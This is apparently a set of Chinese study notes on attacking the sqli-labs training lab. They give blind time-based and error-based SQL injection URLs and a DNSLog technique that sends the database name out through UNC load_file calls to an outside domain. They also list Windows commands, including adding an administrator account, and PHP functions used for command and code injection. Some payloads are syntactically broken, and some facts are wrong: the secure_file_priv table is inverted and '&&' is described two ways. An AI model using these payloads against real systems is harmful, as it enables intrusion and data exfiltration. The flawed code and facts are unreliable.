SELECT LENGTH(DATABASE())=8;
SELECT IF(expression,value1,value2)
SELECT if((1=1),1,0);  #真为1假为0
SELECT SLEEP(1); #睡眠一秒
SELECT SLEEP(if((SELECT length (DATABASE())=8),1,0));
##或者
SELECT if(LENGTH(DATABASE())=8,SLEEP(1),0)
```



```
http://sqli-labs/Less-9/?id=1' and SELECT if(ascii(SUBSTR((SELECT DATABASE()),1,1))=115,sleep(5),0) -- 
```

浏览器会延迟响应5秒如果为真

#查表名

```
http://sqli-labs/Less-9/?id=1' and SELECT if(ascii(SUBSTR((SELECT table_name from information_schema.tables where table_schema=database()limit 0,1),1,1)=101,sleep(5),0) -- 
```

#查列名


```
http://sqli-labs/Less-9/?id=1' and SELECT if(ascii(SUBSTR((SELECT column_name from informtion_schema.columns where table_schema='security' and table_name='emails' limit 0,1),1,1))>104,sleep(1),(0) -- 
```

#拿数据

```
http://sqli-labs/Less-9/?id=1' and ORD(mid((SELECT IFNULL(CAST(username AS char),0x20)FROM SECURITY.users ORDER BY id LIMIT 0,1),1,1))=68，sleep(1),0) -- 
```

### 基于报错的注入

基于报错的注入 

![image-20220429233412636](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182203513-391977956.png)

适用场景：没有数据回显，条件正确与否结果一样，sleep 没区别，但是错误信息会打印出来 

利用方式：利用语法错误，把value在前端输出

```
#从XML节点中查找节点
select extractValue('<a><b></b></a>','/a/b');

#更新XML节点的值
select
updateXML('<a><b>ccc</b><d></d></a>','/a','<e>fff</e>') AS vall,
updateXML('<a><b>ccc</b><d></d></a>','/b','<e>fff</e>') AS val2,
updateXML('<a><b>ccc</b><d></d></a>','//b','<e>fff</e>') AS val3,
updateXML('<a><b>ccc</b><d></d></a>','/a/b','<e>fff</e>') AS val4,
updateXML('<a><d></d><b>ccc</b><d></d></a>','/a/d','<e>fff</e>') AS val5,
```

```
http://sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1) -- 
```

![image-20220506193143219](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182204134-584375247.png)



```
http://sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- 
```

![image-20220506193815111](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182204889-908379824.png)

```
#拿列名
http://sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema='security' and table_name='users'),0x7e),1) -- 
```

### DNSLog注入

![image-20220506195005103](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182209818-1661689046.png)

```
#DNSLog平台
http://www.dnslog.cn/
```



```
#可以在前面拼接字符串
lkb.yzdyla.ceye.io
yzdyla.ceye.io
```

![image-20220507214723123](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182210306-210864835.png)

![image-20220507214035937](photo/image-20220507214035937.png)

### UNC(windows)

**U**niversal **N**aming **C**onvention 通用命名规则

一种访问资源的一种地址的格式

描述网络资源上的资源格式

#### MySQL读写函数

secure_file_priv

| 配置值     | 描述                           |
| ---------- | ------------------------------ |
| 指定文件夹 | 导入导出只能发生在指定的文件夹 |
| 不设置     | 不允许执行                     |
| null       | 没有任何限制                   |

#### MySQL读写函数

select LOAD_FILE('E:\\in.txt'); 

1、只能访问本机的文件 

2、文件需要有读取权限 

3、字节数小于max_allowed_packet 

**否则返回NULL** 

```mysql
#把123写进到out文本文件里面去，如果不存在创建一个


```



#### DNSLog注入流程

1、把select LOAD_FILE()注入到数据库，访问文 件 

2、UNC构建DNS服务器地址，假装访问文件， 产生DNSLog 

```mysql
select load_file('////aaa.yourid.dnslog.cn/wuya'); 
```

3、把子域名替换成函数或者查询SQL 

```mysql
select if((select load_file(concat('////',database(),'.yourid.dnslog.cn/wuya'))),1,0);
```

 ![image-20220519222312837](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182212454-1751394905.png)

CEYE平台

Structured 

系统库 描述 

注册 https://sso.telnet404.com/accounts/reg ister/ 

查看ID和Token http://ceye.io/profile 

查看DNSLog记录 http://ceye.io/records/dn

DNSLog注入脚本  

python 2 

dnslogSql.py -u http://localhost/sqli-labs/Less-9/?id=1 -c 

dnslogSql.py -u "http://localhost/sqli-labs/Less-9/?id=1' and ({})--+" --dbs --dbs get database 

-D DB database name 

--tables get table 

-T TABLE table name 

--columns get column 

-C COLUMN column name 

--dump  get data

#### SQL注入如何防止

![image-20220519231335350](https://img2023.cnblogs.com/blog/2554043/202212/2554043-20221204182213484-1655421564.png)

#### WAF绕过思路

1、内容进行过滤

union select order by updatexml

update delete

2、字符转义

3、杜绝SQL拼接——根治

预编译 prepare statement

4、控制错误信息

不让它返回到前台

5、数据库权限的控制

读写函数

root/  管理员

 MySQL用户

6、数据库定义

7、数据加密

例如用户表 MD5+salt

8、web应用防火墙

WAF

一个开源的waf有Modsecurity

#### 命令执行漏洞

 windows常用的命令

参考 https://www.uc23.net/command/msdos/

覆盖输出 >

追加输出 >>

管道符 |

目录分隔符 \

执行多条命令，不管命令是否执行成功 &&

顺序执行多条命令，当碰到执行出错的命令后将不执行后米娜的命令  &&

start 再打开一个窗口

exit 关闭cmd窗口

cls清屏

e:  切换盘符

##### 文件/目录命令

查看目录树  tree c:\

列出、搜索文件  dir c:\     dir test*

在当前目录和环境变量搜索文件  where java

切换目录  （change directory）   cd /d d: \test    /d代表切换驱动器

创建目录 md aaa bbb      md  d:\ccc\ddd

复制文件 copy 1.txt c:\test    

移动文件move 1.txt  c:\test

文件重命名  rename   ren 1.txt 2.txt

删除目录（remove directory） rd imgs 空目录     rmdir /s d:\test 非空目录

删除文件 del 1.txt

##### 文本内容

查看文本内容  type 1.txt    more redis.conf      空格：下一屏 q：退出

查找文本内容   find "abc" d:\test.txt

查找文本内容 findstr "hello world" 1.txt

输出内容到文件   echo test > p1.txt     echo %java_home%

将键盘输入的内容拷贝到文件     copy con 1.txt

显示当前机器名 hostname

查看当前计算机的综合信息 systeminfo

任务计划 schtasks

##### 系统

显示当前机器名   hostname

查看当前计算器的综合信息  systeminfo

任务计划  schtasks

操作系统版本  

ver   终端显示操作系统当前版本号

winver    以弹窗显示操作系统当前版本号

注销计算器  logoff

关机和定时关机  shutdown

##### 网络

查看当前网络IP  ipconfig  -all

###### 网络情况   

查看开启了哪些端口 netstart -a

查看端口的网络连接情况   netstart -n

查看正在进行的工作  netstat -v

查看tcp协议的使用情况  netstart -p tcp

###### 测试网络是否通畅

ping baidu.com

向qq.com发送10次65500字数的ping   ping -|65500 -n 10 qq.com

不断地测试baidu服务器的连接情况   ping -t baidu.com 

解析域名为ip   nslookup baidu.com

显示出IP路由  route print

查看本机到达192.168.142.132的路由路径 tracert 192.168.142.132

设置防火墙 netsh advfirewall 

###### telnet 

telnet 192.168.142.128 22 

探测192.168.142.128是否使用TCP协议监听22端口 

显示arp缓存表 arp –a

##### 进程 

显示当前运行的进程信息 tasklist

 按进程号关闭进程 taskkill /pid 2448 

按进程名关闭进程 taskkill /im notepad.exe 

###### 强行终止进程 

taskkill /f /im notepad.exe 

taskkill /f /pid 2152

服务 

查看已经启动的服务 net start 

启动服务 net start MySQL57 

关闭服务 net stop MySQL57 

用户 

显示当前用户的名称 whoami 

输出当前计算机所有用户 net user 

输出用户的详细信息 net user 用户名 

修改用户密码 net 用户名 密码 

新建用户 net user dev 123456 /add 

添加到管理员用户组 net localgroup administrators dev /add  

删除用户 net user dev /del

常用程序 

计算器 calc 

远程桌面 mstsc  

控制面板 control 

启动项配置 msconfig 

磁盘清理工具 cleanmgr 

计算机管理 compmgmt.msc

###  远程代码执行（rce）

远程代码执行：Remote Code Execute

远程命令执行：Remote Command Execute

### Windows命令拼接符号

| 符号 | 含义                                 | 示例                               |
| ---- | ------------------------------------ | ---------------------------------- |
| &&   | 左边的命令执行成功右边的才会执行     | ping 127.0.0.1 && echo 'hello'     |
| &    | 简单的拼接                           | ping 111 & echo 'hello'            |
| \|   | 上一条命令的输出，作为下一条命令参数 | netstat -ano \|findstr 3306        |
| \|\| | 左边的命令执行失败，右边的才执行     | ping baidu.com \|\| ping baidu.net |

### Linux命令拼接符号

| 符号 | 含义                                 | 示例                           |
| ---- | ------------------------------------ | ------------------------------ |
| ；   | 没有任何逻辑关系的连接符             |                                |
| &&   | 左边的命令执行成功，右边的才会执行   | cp 1.txt 2.txt && cat 2.cat    |
| \|   | 上一条命令的输出，作为下一条命令参数 | netstat -an\|grep 3306         |
| \|\| | 左边的命令执行失败，右边的才执行     | cat 3.txt \|\| cat 2.txt       |
| &    | 任务后台执行，与nohup命令功能差不多  | java -jar test.jar > log.txt & |

### 命令command注入

| 函数                | 作用                                                      |
| ------------------- | --------------------------------------------------------- |
| system()            | 执行外部程序，并且显示输出                                |
| exec()/shell_exec() | 通过shell环境执行命令，并且将完整的输出以字符串的方式返回 |
| pcntl_exec()        | 在当前进程空间执行指定程序                                |
| passthru()          | 执行外部程序并且显示原始输出                              |
| popen()             | 打开进程文件指针                                          |
| proc—open()         | 执行一个命令，并且打开用来输入\输出的文件指针             |

### 代码code注入

| 函数                                    | 作用                                                       |
| --------------------------------------- | ---------------------------------------------------------- |
| eval()                                  | 把字符串code作为PHP代码执行                                |
| assert()                                | 检查一个断言是否为false                                    |
| preg_replace()                          | 执行一个正则表达式的搜索和替换                             |
| create_function                         | 创建一个匿名函数并且返回函数名称                           |
| call_user_func()/call_user_func_array() | 把第一个参数作为回调函数调用                               |
| usort()/uasort()                        | 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 |
|                                         |                                                            |













